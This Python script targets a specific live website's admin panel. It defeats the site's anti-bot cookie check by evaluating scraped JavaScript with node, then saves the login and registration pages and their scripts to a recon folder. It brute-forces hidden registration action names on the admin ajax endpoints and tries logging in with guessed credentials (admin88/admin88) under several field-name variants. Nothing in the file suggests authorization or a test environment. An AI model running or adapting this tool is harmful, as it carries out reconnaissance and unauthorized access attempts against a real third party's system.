#!/usr/bin/env python3
import re
import subprocess
import urllib.parse
import urllib.request
import http.cookiejar
from pathlib import Path

HOST = "http://xunqq.cn"
BASE = HOST + "/admin"
UA = "Mozilla/5.0"
OUT = Path("/data/recon/pfqq.net/probe")


def main():
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

    def get(url, data=None):
        h = {
            "User-Agent": UA,
            "Referer": BASE + "/",
            "Accept": "*/*",
            "X-Requested-With": "XMLHttpRequest",
        }
        if data is not None:
            h["Content-Type"] = "application/x-www-form-urlencoded"
        req = urllib.request.Request(url, data=data, headers=h)
        return op.open(req, timeout=20).read().decode("utf-8", "ignore")

    def setc(n, v):
        cj.set_cookie(
            http.cookiejar.Cookie(
                0, n, v, None, False, "xunqq.cn", False, False, "/", False,
                False, None, False, None, None, {},
            )
        )

    get(HOST + "/nasgo/")
    get(HOST + "/loading/")
    html = get(BASE + "/")
    m = re.search(
        r"setCookie\(\s*[\"']sec_defend[\"']\s*,\s*(.+?)\)\s*;\s*setCookie\(\s*[\"']sec_defend_time[\"']",
        html,
        re.S,
    )
    val = subprocess.run(
        ["node", "-e", f"console.log({m.group(1)})"],
        capture_output=True,
        text=True,
    ).stdout.strip()
    setc("sec_defend", val)
    setc("sec_defend_time", "2")
    get(BASE + "/index.php")

    for path in ["/user/login.php", "/user/reg.php"]:
        body = get(BASE + path)
        fname = path.replace("/", "_") + ".html"
        (OUT / fname).write_text(body, encoding="utf-8")
        print("====", path, len(body))
        print("SRC", re.findall(r"src=[\"']([^\"']+)[\"']", body)[:20])
        for i, s in enumerate(re.findall(r"<script[^>]*>([\s\S]*?)</script>", body)):
            low = s.lower()
            if any(k in low for k in ["ajax", "login", "pass", "user", "reg", "submit"]):
                print(f"-- script {i} --")
                print(s[:2500])
        print("INPUTS", re.findall(r"<(?:input|button)[^>]+>", body, re.I)[:40])

    # try common rainbow reg acts with correct field names after inspecting
    # also download external user js if any
    for src in [
        "/assets/js/user.js",
        "/assets/js/login.js",
        "/user/assets/js/user.js",
        "/assets/faka/js/user.js",
    ]:
        try:
            body = get(HOST + src)
            if len(body) > 50 and not body.startswith("HTTP"):
                print("JS", src, len(body))
                print(body[:1500])
                (OUT / ("js_" + src.replace("/", "_"))).write_text(body, encoding="utf-8")
        except Exception as e:
            print("JS ERR", src, e)

    # brute reg acts
    user = "r" + val[:8]
    pwd = "Test123456"
    for act in [
        "reg", "register", "signup", "adduser", "userreg", "reguser",
        "zhuce", "checkuser", "check",
    ]:
        for endpoint in [BASE + "/user/ajax.php", BASE + "/ajax.php"]:
            for payload in [
                {"act": act, "user": user, "pass": pwd, "qq": "123456789"},
                {"act": act, "username": user, "password": pwd, "qq": "123456789"},
            ]:
                # act in URL for hybrid
                body = get(
                    endpoint + "?act=" + act,
                    data=urllib.parse.urlencode(
                        {k: v for k, v in payload.items() if k != "act"}
                    ).encode(),
                )
                if "No Act" not in body:
                    print("REGHIT", endpoint, act, payload.keys(), body[:200])

    # login field name variants
    for payload in [
        {"user": "admin88", "pass": "admin88"},
        {"username": "admin88", "password": "admin88"},
        {"user": "admin88", "pwd": "admin88"},
        {"account": "admin88", "password": "admin88"},
        {"user": "admin88", "pass": "admin88", "code": ""},
    ]:
        body = get(
            BASE + "/user/ajax.php?act=login",
            data=urllib.parse.urlencode(payload).encode(),
        )
        print("LOGINFIELD", list(payload.keys()), body[:200])


if __name__ == "__main__":
    main()
